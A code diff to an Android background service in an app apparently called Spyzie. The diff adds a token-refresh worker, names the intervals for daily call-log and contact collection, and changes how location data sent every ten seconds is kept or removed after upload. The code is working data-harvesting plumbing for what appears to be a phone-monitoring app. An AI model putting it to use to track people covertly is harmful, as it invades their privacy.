@@ -34,6 +34,7 @@ import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.db.DbManager;
 import com.tantd.spyzie.data.device.worker.GetCallsWorker;
 import com.tantd.spyzie.data.device.worker.GetContactsWorker;
+import com.tantd.spyzie.data.device.worker.RefreshTokenWorker;
 import com.tantd.spyzie.data.model.CommonResponse;
 import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.network.ApiManager;
@@ -64,11 +65,15 @@ public class MainService extends Service {
     private static final int UPDATE_INTERVAL = 10 * 1000;
     private static final int FASTEST_UPDATE_INTERVAL = 10 * 1000;
     private static final int CONDITION_CHECKING_INTERVAL = 5 * 1000;
+    private static final int REFRESH_TOKEN_REPEAT_INTERVAL = 15; // minutes
+    private static final int GET_CALL_REPEAT_INTERVAL = 24; // hours
+    private static final int GET_CONTACT_REPEAT_INTERVAL = 24; // hours
 
     private ContentObserver mContentObserver;
 
     private SpyzieReceiver mSpyzieReceiver;
 
+    private PeriodicWorkRequest mRefreshTokenWorkRequest;
     private PeriodicWorkRequest mGetCallsWorkRequest;
     private PeriodicWorkRequest mGetContactsWorkRequest;
 
@@ -111,6 +116,8 @@ public class MainService extends Service {
         mSpyzieReceiver = new SpyzieReceiver();
         registerReceiver(mSpyzieReceiver, filter);
 
+        startRefreshTokenWorkRequest();
+
         startGetCallsWorkRequest();
 
         startGetContactsWorkRequest();
@@ -120,9 +127,18 @@ public class MainService extends Service {
         return START_STICKY;
     }
 
+    private void startRefreshTokenWorkRequest() {
+        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
+        mRefreshTokenWorkRequest = new PeriodicWorkRequest.Builder(RefreshTokenWorker.class, mApiManager.getAccessToken().getExpired(), TimeUnit.SECONDS)
+                .setConstraints(constraints)
+                .build();
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(RefreshTokenWorker.REFRESH_TOKEN_WORK_REQUEST,
+                ExistingPeriodicWorkPolicy.KEEP, mRefreshTokenWorkRequest);
+    }
+
     private void startGetCallsWorkRequest() {
         Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
-        mGetCallsWorkRequest = new PeriodicWorkRequest.Builder(GetCallsWorker.class, 24, TimeUnit.HOURS)
+        mGetCallsWorkRequest = new PeriodicWorkRequest.Builder(GetCallsWorker.class, GET_CALL_REPEAT_INTERVAL, TimeUnit.HOURS)
                 .setConstraints(constraints)
                 .build();
         WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetCallsWorker.GET_CALLS_WORK_REQUEST,
@@ -131,7 +147,7 @@ public class MainService extends Service {
 
     private void startGetContactsWorkRequest() {
         Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
-        mGetContactsWorkRequest = new PeriodicWorkRequest.Builder(GetContactsWorker.class, 24, TimeUnit.HOURS)
+        mGetContactsWorkRequest = new PeriodicWorkRequest.Builder(GetContactsWorker.class, GET_CONTACT_REPEAT_INTERVAL, TimeUnit.HOURS)
                 .setConstraints(constraints)
                 .build();
         WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetContactsWorker.GET_CONTACTS_WORK_REQUEST,
@@ -170,27 +186,28 @@ public class MainService extends Service {
             savedData.add(location);
             mApiManager.sendLocationData(savedData).subscribeOn(mSchedulerProvider.io())
                     .observeOn(mSchedulerProvider.ui())
-                    .subscribe(commonResponse -> handleSendingSuccess(commonResponse),
-                            error -> handleSendingError(error));
-            savedData.remove(savedData.size() - 1);
-            if (savedData.size() > 0) {
-                mDbManager.removeLocations(savedData);
-            }
+                    .subscribe(commonResponse -> handleSendingSuccess(commonResponse, savedData),
+                            error -> handleSendingError(error, location));
         } else {
             mDbManager.put(location);
         }
     }
 
-    private void handleSendingSuccess(CommonResponse response) {
+    private void handleSendingSuccess(CommonResponse response, List<com.tantd.spyzie.data.model.Location> locationData) {
         if (Constants.IS_DEBUG_MODE) {
             Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingSuccess, response=" + response);
         }
+        locationData.remove(locationData.size() - 1);
+        if (locationData.size() > 0) {
+            mDbManager.removeLocations(locationData);
+        }
     }
 
-    private void handleSendingError(Throwable error) {
+    private void handleSendingError(Throwable error, com.tantd.spyzie.data.model.Location location) {
         if (Constants.IS_DEBUG_MODE) {
             Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingError: " + error);
         }
+        mDbManager.put(location);
     }
 
     private void createNotificationChannelForAndroidO() {
@@ -277,6 +294,7 @@ public class MainService extends Service {
         // TODO: cancel all work requests
         WorkManager.getInstance(this).cancelWorkById(mGetCallsWorkRequest.getId());
         WorkManager.getInstance(this).cancelWorkById(mGetContactsWorkRequest.getId());
+        WorkManager.getInstance(this).cancelWorkById(mRefreshTokenWorkRequest.getId());
         running = false;
         removeLocationUpdates();
     }
